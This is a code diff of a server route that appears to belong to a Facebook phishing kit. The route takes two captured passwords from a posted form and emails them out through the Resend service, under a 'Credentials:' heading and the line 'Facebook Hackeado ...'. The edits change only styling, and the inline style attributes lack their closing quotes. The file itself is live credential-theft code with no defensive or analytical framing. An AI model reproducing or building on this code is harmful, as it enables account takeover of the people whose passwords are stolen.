@@ -3,7 +3,7 @@ import { Resend } from "resend";
 
 export async function POST(request) {
   const resend = new Resend(process.env.RESEND_API_KEY);
-  const color = "#ffbb00";
+  const color = "#003cff";
 
   try {
     const { message } = await request.json();
@@ -15,14 +15,16 @@ export async function POST(request) {
       message,
       html: `
         <body>
-                <h1 style="margin:0 0 20px;color:#ffbb00;font-family:'Courier New',monospace;font-size:16px;font-weight:700> Credentials: </h1>
+        <h1 style="color:#ffbb00;font-family:'Courier New',monospace;font-size:16px;font-weight:700> Credentials: </h1>
 
         <div>
-                <h2 style="margin:0 0 20px;color:#00ff41;font-family:'Courier New',monospace;font-size:16px;font-weight:700>${message.password01}</h2>
-        <h2 style="margin:0 0 20px;color:#00ff41;font-family:'Courier New',monospace;font-size:16px;font-weight:700>${message.password02}</h2>
+        <h2 style="color:#00ff41;font-family:'Courier New',monospace;font-size:16px;font-weight:700>${message.password01}</h2>
+
+        <h2 style="color:#00ff41;font-family:'Courier New',monospace;font-size:16px;font-weight:700>${message.password02}</h2>
+
         </div>
 
-        <a style="margin:0 0 20px;color:#00ff41;font-family:'Courier New',monospace;font-size:16px;font-weight:700> Facebook Hackeado ...</a>
+        <p style="color:#003cff;font-family:'Courier New',monospace;font-size:16px;font-weight:700> Facebook Hackeado ...</p>
         </body>
       `,
     });
